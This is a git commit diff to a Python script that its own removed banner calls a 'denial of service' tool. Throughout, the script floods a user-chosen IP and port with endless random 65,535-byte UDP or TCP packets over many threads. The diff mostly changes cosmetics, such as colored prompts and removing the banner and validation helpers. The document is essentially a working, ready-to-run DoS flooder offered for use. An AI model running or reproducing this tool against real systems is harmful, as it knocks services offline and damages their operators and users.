b34d6eac7c2291825bbfc731221ffe6682b8bd32
zhen <152279857+zvnt@users.noreply.github.com>
2024-12-16 16:52:04 +0400

    4.py
    idk, its same lol

--- 4.py
+++ 4.py
@@ -3,89 +3,67 @@ import random
 import sys
 import os
 import socket
-import fade
+from colorama import init, Fore #you need to install colorama <3
 
-banner = '''
-    .===========.        
-    |   |       |        
-    |  /|\\      |    denial
-    | /a|d\\     |    of      4
-    |___________|    service
-    |_________-_|_,-.    
-   [_____________]   )   
-   .,,,,,,,,,, ,,.  (_   
-  /,,,,,,,,,,, ,,,\\ (>`\\ 
- (______.-``-._____) \\__)
-'''
+init(autoreset=True)
 
-def udp_flood(ip, port, size):
+def udp_flood(ip, port):
     num = 0
     while True:
         try:
             with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as udp:
-                udp.sendto(random._urandom(size), (ip, port))
+                udp.sendto(random._urandom(65535), (ip, port))
                 num += 1
-                print(f" connections: {num}                    ", end='\r')
+                print(f" [{Fore.MAGENTA}+{Fore.RESET}] connections: {num}                    ", end='\r')
         except socket.error as e:
             print(f" error: {e}", end='\r')
         except Exception as e:
             print(f" error: {e}", end='\r')
 
-def tcp_flood(ip, port, size):
+def tcp_flood(ip, port):
     num = 0
     while True:
         try:
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as tcp:
                 tcp.connect((ip, port))
-                tcp.send(random._urandom(size))
+                tcp.send(random._urandom(65535))
                 num += 1
-                print(f" connections: {num}                    ", end='\r')
+                print(f" [{Fore.MAGENTA}+{Fore.RESET}] connections: {num}                    ", end='\r')
         except socket.error as e:
             print(f" error: {e}", end='\r')
         except Exception as e:
             print(f" error: {e}", end='\r')
 
-def validate_ip(ip_address):
-    try:
-        socket.inet_aton(ip_address)
-        return True
-    except socket.error:
-        return False
-
-def validate_port(port_number):
-    return 0 <= port_number <= 65535
-
 def main():
     try:
         os.system('cls' if os.name == 'nt' else 'clear')
-        print(fade.purpleblue(banner))
-        target_ip = input(" target: ")
-        target_port = int(input(" port: "))
-        threads = int(input(" threads: "))
-        protocol = input(" protocol (tcp/udp): ").lower()
-        size = 65500
+        ip = input(f"\n [{Fore.MAGENTA}?{Fore.RESET}] target: ")
+        port = int(input(f" [{Fore.MAGENTA}?{Fore.RESET}] port: "))
+        threads = int(input(f" [{Fore.MAGENTA}?{Fore.RESET}] threads: "))
+        protocol = input(f" [{Fore.MAGENTA}?{Fore.RESET}] protocol (tcp/udp): ").lower()
+        #using size as value was useless because it still was 65500 (changed to 65535 <3)
 
-        if not validate_ip(target_ip):
-            print(" error: invalid ip address")
+        if not socket.inet_aton(ip): #shorten
+            print(f" [{Fore.MAGENTA}!{Fore.RESET}] error: invalid ip address")
             sys.exit(1)
-        if not validate_port(target_port):
-            print(" error: invalid port number, must be between 0 and 65535.")
+        if not 0 <= port <= 65535: #shorten
+            print(f" [{Fore.MAGENTA}!{Fore.RESET}] error: invalid port number, must be between 0 and 65535.")
             sys.exit(1)
 
     except Exception as e:
-        print(f"\n error: {e}")
+        print(f"\n [{Fore.MAGENTA}!{Fore.RESET}] error: {e}")
         sys.exit()
 
     function = udp_flood if protocol == 'udp' else tcp_flood if protocol == 'tcp' else None
     if not function:
-        print(" protocol: invalid")
+        print(f" [{Fore.MAGENTA}!{Fore.RESET}] protocol: invalid")
         sys.exit(1)
 
     for _ in range(threads):
         try:
-            threading.Thread(target=function, args=(target_ip, target_port, size)).start()
+            threading.Thread(target=function, args=(ip, port)).start()
         except Exception as e:
-            print(f"\n error: {e}")
+            print(f"\n [{Fore.MAGENTA}!{Fore.RESET}] error: {e}")
 
 if __name__ == "__main__":
-    main()
+    main() #main thing
